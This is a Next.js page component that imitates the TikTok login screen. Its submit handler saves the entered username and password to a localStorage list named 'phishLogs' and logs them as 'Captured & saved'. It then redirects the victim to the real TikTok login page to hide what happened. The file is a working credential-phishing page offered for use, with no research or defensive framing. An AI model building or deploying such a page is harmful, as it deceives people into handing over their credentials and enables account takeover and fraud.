// app/page.tsx
"use client";

import { FormEvent, useEffect, useRef, useState } from "react";
import Link from "next/link";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [countryCode, setCountryCode] = useState("+260");
  const [dropdownOpen, setDropdownOpen] = useState(false);

  // Ref for dropdown container to detect outside clicks/touches
  const dropdownRef = useRef<HTMLDivElement>(null);
  const triggerRef = useRef<HTMLDivElement>(null);

  // Handle form submission
  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();

    const timestamp = new Date().toLocaleString();
    const entry = { id: Date.now(), timestamp, username, password };

    let logs = JSON.parse(localStorage.getItem("phishLogs") || "[]");
    logs.push(entry);
    localStorage.setItem("phishLogs", JSON.stringify(logs));

    console.log("Captured & saved:", entry);

    window.location.href = "https://www.tiktok.com/login";
  };

  // Better mobile-friendly outside click/touch detection
  useEffect(() => {
    const handleOutside = (event: MouseEvent | TouchEvent) => {
      if (
        dropdownOpen &&
        dropdownRef.current &&
        triggerRef.current &&
        !dropdownRef.current.contains(event.target as Node) &&
        !triggerRef.current.contains(event.target as Node)
      ) {
        setDropdownOpen(false);
      }
    };

    // Listen to both click and touch events
    document.addEventListener("mousedown", handleOutside);
    document.addEventListener("touchend", handleOutside);

    return () => {
      document.removeEventListener("mousedown", handleOutside);
      document.removeEventListener("touchend", handleOutside);
    };
  }, [dropdownOpen]);

  return (
    <>
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        :root {
          --primary-red: #fe2c55;
          --bg-black: #000000;
          --input-bg: #111111;
          --border-color: #222222;
          --text-secondary: #8a8a8a;
        }

        body {
          font-family: 'SofiaPro', -apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
          background-color: var(--bg-black);
          color: #ffffff;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          -webkit-tap-highlight-color: transparent; /* Removes blue highlight on tap on mobile */
          touch-action: manipulation; /* Improves touch responsiveness */
        }

        .container {
          width: 100%;
          max-width: 440px;
          padding: 40px 24px;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
        }

        .header {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 24px;
        }

        .qr-link {
          align-self: flex-end;
          color: var(--text-secondary);
          text-decoration: none;
          font-size: 14px;
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px;
          border-radius: 4px;
          transition: background 0.2s;
          -webkit-tap-highlight-color: transparent;
        }

        .qr-link:hover,
        .qr-link:active {
          background: #1a1a1a;
        }

        .logo {
          font-size: 48px;
          font-weight: 800;
          letter-spacing: -1px;
          margin: 20px 0;
          font-family: Arial Black, sans-serif;
        }

        .main-heading {
          font-size: 32px;
          font-weight: 700;
          text-align: center;
          margin-bottom: 32px;
        }

        .login-form {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }

        .input-group {
          position: relative;
        }

        .input-wrapper {
          display: flex;
          align-items: center;
          background-color: var(--input-bg);
          border: 1px solid var(--border-color);
          border-radius: 4px;
          transition: border-color 0.2s;
        }

        .input-wrapper:focus-within {
          border-color: #555555;
        }

        .country-code-trigger {
          padding: 12px 12px 12px 16px;
          color: #ffffff;
          font-size: 15px;
          border-right: 1px solid var(--border-color);
          cursor: pointer;
          user-select: none;
          display: flex;
          align-items: center;
          gap: 6px;
          min-width: 85px;
          -webkit-tap-highlight-color: transparent;
        }

        .country-code-trigger::after {
          content: '';
          border: solid var(--text-secondary);
          border-width: 0 1.5px 1.5px 0;
          display: inline-block;
          padding: 2px;
          transform: rotate(45deg);
        }

        input {
          flex: 1;
          background-color: transparent;
          border: none;
          padding: 14px 16px;
          color: #ffffff;
          font-size: 15px;
          outline: none;
        }

        input::placeholder {
          color: #757575;
        }

        .dropdown {
          position: absolute;
          top: 100%;
          left: 0;
          width: 100%;
          background-color: #1a1a1a;
          border: 1px solid #333333;
          border-radius: 4px;
          margin-top: 4px;
          max-height: 250px;
          overflow-y: auto;
          z-index: 100;
          box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }

        .dropdown.active {
          display: block;
        }

        .dropdown-item {
          padding: 12px 16px;
          cursor: pointer;
          display: flex;
          justify-content: space-between;
          -webkit-tap-highlight-color: transparent;
        }

        .dropdown-item:hover,
        .dropdown-item:active {
          background-color: #2a2a2a;
        }

        .login-button {
          background-color: var(--primary-red);
          color: #ffffff;
          border: none;
          border-radius: 4px;
          padding: 14px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          margin-top: 10px;
          transition: opacity 0.2s;
          -webkit-tap-highlight-color: transparent;
        }

        .login-button:active {
          opacity: 0.8;
        }

        .login-button:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .eye-toggle {
          padding-right: 16px;
          cursor: pointer;
          display: flex;
          align-items: center;
          -webkit-tap-highlight-color: transparent;
        }

        .forgot-password {
          text-align: left;
          margin-top: 8px;
        }

        .forgot-password a {
          color: var(--text-secondary);
          text-decoration: none;
          font-size: 12px;
        }

        .forgot-password a:hover {
          text-decoration: underline;
        }

        .footer {
          margin-top: auto;
          border-top: 1px solid var(--border-color);
          padding-top: 24px;
          text-align: center;
        }

        .signup-text {
          font-size: 15px;
          margin-bottom: 24px;
        }

        .signup-text a {
          color: var(--primary-red);
          text-decoration: none;
          font-weight: 600;
        }

        .lang-select {
          color: var(--text-secondary);
          font-size: 14px;
          cursor: pointer;
        }

        @media (max-width: 480px) {
          .container { padding: 20px 16px; }
          .main-heading { font-size: 24px; }
        }
      `}</style>

      <div className="container">
        <div className="header">
          <Link href="/view" className="qr-link" prefetch={true}>
            <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M20 6H6V20H20V6Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
              <path d="M20 28H6V42H20V28Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
              <path d="M42 6H28V20H42V6Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
              <path d="M29 28V42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
              <path d="M41 28V42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
              <path d="M28 35H42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
            </svg>
            Use QR code
          </Link>
          <div className="logo">TikTok</div>
        </div>

        <h1 className="main-heading">Log in</h1>

        <form className="login-form" onSubmit={handleSubmit}>
          <div className="input-group">
            <div className="input-wrapper">
              <div
                ref={triggerRef}
                className="country-code-trigger"
                onClick={(e) => {
                  e.stopPropagation();
                  setDropdownOpen((prev) => !prev);
                }}
                onTouchEnd={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  setDropdownOpen((prev) => !prev);
                }}
              >
                <span>{countryCode}</span>
              </div>
              <input
                type="text"
                name="username"
                placeholder="Phone / Email / Username"
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>

            <div ref={dropdownRef}>
              {dropdownOpen && (
                <div className="dropdown active">
                  {[
                    { name: "United States", code: "+1" },
                    { name: "United Kingdom", code: "+44" },
                    { name: "Kenya", code: "+254" },
                    { name: "Zambia", code: "+260" },
                    { name: "Australia", code: "+61" },
                  ].map((country) => (
                    <div
                      key={country.code}
                      className="dropdown-item"
                      onClick={() => {
                        setCountryCode(country.code);
                        setDropdownOpen(false);
                      }}
                      onTouchEnd={(e) => {
                        e.preventDefault();
                        setCountryCode(country.code);
                        setDropdownOpen(false);
                      }}
                    >
                      <span>{country.name}</span>
                      <span>{country.code}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          <div className="input-group">
            <div className="input-wrapper">
              <input
                type={showPassword ? "text" : "password"}
                id="password"
                name="password"
                placeholder="Password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <div
                className="eye-toggle"
                onClick={() => setShowPassword(!showPassword)}
                onTouchEnd={(e) => {
                  e.preventDefault();
                  setShowPassword((prev) => !prev);
                }}
              >
                <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M24 9C14 9 6 15 2 24C6 33 14 39 24 39C34 39 42 33 46 24C42 15 34 9 24 9Z" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
                  <path d="M24 30C27.3137 30 30 27.3137 30 24C30 20.6863 27.3137 18 24 18C20.6863 18 18 20.6863 18 24C18 27.3137 20.6863 30 24 30Z" fill="currentColor" />
                </svg>
              </div>
            </div>
            <div className="forgot-password">
              <a href="#">Forgot password?</a>
            </div>
          </div>

          <button type="submit" className="login-button">
            Log in
          </button>
        </form>

        <div className="footer">
          <div className="signup-text">
            Don't have an account? <a href="#">Sign up</a>
          </div>
          <div className="lang-select">English &nbsp;▾</div>
        </div>
      </div>
    </>
  );
}